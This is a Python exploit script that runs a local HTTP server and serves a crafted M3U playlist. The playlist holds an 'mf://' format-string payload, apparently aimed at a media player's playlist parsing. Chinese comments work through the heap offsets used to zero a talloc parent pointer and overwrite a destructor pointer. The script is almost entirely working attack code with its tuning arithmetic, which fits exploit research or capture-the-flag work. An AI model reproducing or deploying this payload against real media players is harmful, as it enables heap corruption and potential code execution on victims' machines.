#!/usr/bin/env python3

import socket
from pwn import *
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ADDR = ('localhost', 7000)
s.bind(ADDR)
s.listen(5)


def get_playlist(header1, header2, heap_size, zero_arg = 4):

	nnn1 = header2 - header1 - 0x50 + 0x20 - 2 
	father_destructor = f"%{zero_arg}$c%{zero_arg}$c%{zero_arg}$c%{zero_arg}$c%{zero_arg}$c%{zero_arg}$c%{zero_arg}$c%{zero_arg}$c\x22\x22\x22\x22\x22\x22"
	payload = f"%{nnn1}c%c%c" + father_destructor

	padding = b"A" * (heap_size - len(payload))
	nnn = nnn1 - len(padding)

	assert len(str(nnn)) == len(str(nnn1)), "Get nnn length error"
	
	playlist = b'mf://' + padding + (f"%{nnn}c%c%c" + father_destructor).encode()
	return playlist

	"""
	padding = b'A'*0x10
	mf://AA...AA%126c%c%c%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c\x22\x22\x22\x22\x22\x22
	sprintf(fname, "AAA...AA%590c%c%c%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c\x22\x22\x22\x22\x22\x22", count++); 

	# %c 即可格式化一个char类型的数据
	%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c 将8个字节的0x00写到父指针 parent 中，绕过ta_dbg_check_header函数中对前向节点和父节点的检查。
	6个\x22将0x222222222222写入到destruct指针中。

	header2 - header1 = 864
	第一个堆从 data 域开始写，所以要到第二个堆块开始写偏移为 header2 - data1 = 864 - 0x50 = 784
	%nnnc%c%c 希望覆盖的下一个字节是 destructor 前的 parent
	而 parent 相对 header 的偏移是 0x20
	所以 %nnnc%c%c 结束时候偏移是 header2 - data1 + 0x20 = 816
	所以 %nnn 就是 816 - 2 = 814 (%c%c 会输出两个字节)
	而接下来 %4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c 会将 8 字节的 0x00 写入 parent
	接下来 6个\x22将0x222222222222 写入到 destruct 中
	为了保证在堆的相对位置 需要保证申请的相对大小还是 0x40
	len(padding + "%814c%c%c%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c\x22\x22\x22\x22\x22\x22") = 0x40
	len(padding) = 17 = 0x11
	被 padding 往后挤了 0x11 所以， 814 还要往前提 0x11
	所以 最终的数据是 814 - 0x11 = 797
	所以: "A"*0x11 + "%797c%c%c%4$c%4$c%4$c%4$c%4$c%4$c%4$c%4$c\x22\x22\x22\x22\x22\x22"
	"""

header2 = 0x7fffe400eb00
header1 = 0x7fffe400e910
heap_size = 0x50



while True:
	zero_arg = input("Input zero_arg = ")
	if not zero_arg:
		zero_arg = 4
	else:
		zero_arg = int(zero_arg)
		
	playlist = get_playlist(header1, header2, heap_size, zero_arg)
	print("playlist: ", playlist)		
		
	print("[*] listening on ", ADDR, " ...")
	c, a = s.accept()
	d  = b'HTTP/1.1 200 OK\r\n'
	d += b'Content-type: audio/x-mpegurl\r\n'
	d += b'Content-Length: '+str(len(playlist)).encode()+b'\r\n'
	d += b'\r\n'
	d += playlist
	c.send(d)
	print("[+] finish: ", a)
	c.close()